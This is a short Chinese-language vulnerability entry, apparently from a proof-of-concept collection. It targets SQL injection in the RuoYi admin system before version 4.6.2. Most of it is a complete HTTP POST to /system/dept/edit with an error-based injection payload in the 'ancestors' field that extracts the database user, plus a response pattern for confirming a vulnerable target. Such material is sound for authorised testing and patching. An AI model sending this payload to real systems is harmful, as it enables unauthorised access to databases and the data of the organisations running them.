﻿# 若依RuoYi系统 sql注入2

> 更新时间：2024-01-15

> 漏洞编号：

> 漏洞说明：漏洞影响：RuoYi< 4.6.2

> 漏洞特征：

> 验证脚本：HTTP

```
POST /system/dept/edit HTTP/1.1  
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: o0At_2132_saltkey=JW6Gt2hb; o0At_2132_lastvisit=1691240426; o0At_2132_ulastactivity=2db4EUfD9WS50eLvnip%2B9TxK2ZhcO65vPL0dA6sPVF8AQSBMa6Qn; JSESSIONID=cfcf2d1f-f180-46cf-98bb-5eacc4206014
Connection: close

DeptName=1&DeptId=100&ParentId=12&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat((select user()))));#
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?syntax)(?=.*?error).*?$

> 上传文件定位：


> 验证文件来源：若依RuoYi系统 sql注入2.poc
